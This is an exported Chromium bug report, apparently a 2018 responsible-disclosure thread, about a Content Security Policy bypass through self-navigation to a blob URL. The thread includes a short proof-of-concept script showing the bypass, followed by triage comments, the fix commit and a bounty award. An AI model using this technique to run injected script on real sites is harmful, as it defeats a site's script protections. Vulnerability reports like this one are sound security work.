# CSP bypass with blob URL

| Field | Value |
|-------|-------|
| **Issue ID** | [40090110](https://issues.chromium.org/issues/40090110) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | s....@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2018-01-06 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36

Steps to reproduce the problem:
1. Go to https://test.shhnjk.com/blobCSP.html

What is the expected behavior?
Script is blocked by CSP "script-src 'nonce-test'" (Firefox does).

What went wrong?
CSP is bypassed. Note that if the same blob URL is set to iframe or opened to new window, that's blocked correctly.

Source:
<meta http-equiv="content-security-policy" content="script-src 'nonce-test'">
<script nonce="test">
var attackerControlledString = "<script>alert(document.domain)<\/script>"; 
var blob = new Blob([attackerControlledString], {type : 'text/html'});
var url = URL.createObjectURL(blob);
location.href=url;
</script>

Did this work before? N/A 

Chrome version: 63.0.3239.132  Channel: stable
OS Version: OS X 10.13.2
Flash Version:

## Timeline

### el...@chromium.org (2018-01-07)

[Empty comment from Monorail migration]

[Monorail components: Blink>SecurityFeature>ContentSecurityPolicy]

### me...@chromium.org (2018-01-07)

andypaicu@ I think this problem looks similar to (but not quite the same as) https://crbug.com/chromium/756962, could you please take a look?

Feel free to reassign if it makes more sense for someone else to take a look.

### sh...@chromium.org (2018-01-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-07)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-01-21)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### s....@gmail.com (2018-01-21)

[Comment Deleted]

### s....@gmail.com (2018-01-23)

>This also bypasses CSP sandbox such as modals without allow-modals. 
Should I report sandbox bypass as different bug?

### sh...@chromium.org (2018-02-04)

andypaicu: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### s....@gmail.com (2018-02-20)

Is andypaicu@ working on this case?

### an...@chromium.org (2018-02-20)

It's in my backlog but I have not started working on it.

### sh...@chromium.org (2018-03-07)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-03-30)

Just FYI, I would like to publish this bug on November if fixed. It’d be great if this bug could be fixed before that. Thanks!

### sh...@chromium.org (2018-04-18)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-05-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-25)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-07-30)

>It's in my backlog but I have not started working on it.
Seems like your backlog is too big :P

### sh...@chromium.org (2018-09-05)

[Empty comment from Monorail migration]

### an...@chromium.org (2018-09-19)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-10-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d683fb12566eaec180ee0e0506288f46cc7a43e7

commit d683fb12566eaec180ee0e0506288f46cc7a43e7
Author: Andy Paicu <andypaicu@chromium.org>
Date: Tue Oct 09 12:25:52 2018

Inherit CSP when self-navigating to local-scheme URL

As the linked bug example shows, we should inherit CSP when we navigate
to a local-scheme URL (even if we are in a main browsing context).

Bug: 799747
Change-Id: I8413aa8e8049461ebcf0ffbf7b04c41d1340af02
Reviewed-on: https://chromium-review.googlesource.com/c/1234337
Reviewed-by: Mike West <mkwst@chromium.org>
Commit-Queue: Andy Paicu <andypaicu@chromium.org>
Cr-Commit-Position: refs/heads/master@{#597889}
[add] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/WebKit/LayoutTests/external/wpt/content-security-policy/inheritance/blob-url-self-navigate-inherits.sub.html
[add] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/WebKit/LayoutTests/external/wpt/content-security-policy/inheritance/support/navigate-self-to-blob.html
[add] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/WebKit/LayoutTests/external/wpt/content-security-policy/inheritance/support/navigate-self-to-blob.html.sub.headers
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/dom/document.cc
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/dom/document.h
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/dom/document_init.cc
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/dom/document_init.h
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/loader/document_loader.cc
[modify] https://crrev.com/d683fb12566eaec180ee0e0506288f46cc7a43e7/third_party/blink/renderer/core/loader/document_loader.h


### an...@chromium.org (2018-10-09)

>>It's in my backlog but I have not started working on it.
>Seems like your backlog is too big :P
Tell me about it

### sh...@chromium.org (2018-10-09)

[Empty comment from Monorail migration]

### s....@gmail.com (2018-10-10)

>>>It's in my backlog but I have not started working on it.
>>Seems like your backlog is too big :P
>Tell me about it
When you have huge backlog, it'll be difficult for you to fully concentrate on each task :) See https://crbug.com/chromium/894228

### an...@chromium.org (2018-10-11)

I don't seem to have permissions for that bug.

### s....@gmail.com (2018-10-11)

[Comment Deleted]

### ct...@chromium.org (2018-10-11)

@andypaicu: I've added you as owner on the new bug.

### aw...@google.com (2018-10-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-15)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-10-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@google.com (2018-10-22)

Thanks as ever, $1,000 for this report :-)

### aw...@chromium.org (2018-10-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-10-26)

This bug requires manual review: M71 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), kbleicher@(ChromeOS), govind@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-10-26)

[Comment Deleted]

### aw...@google.com (2018-10-26)

[Empty comment from Monorail migration]

### aw...@google.com (2018-12-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/799747?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40090110)*
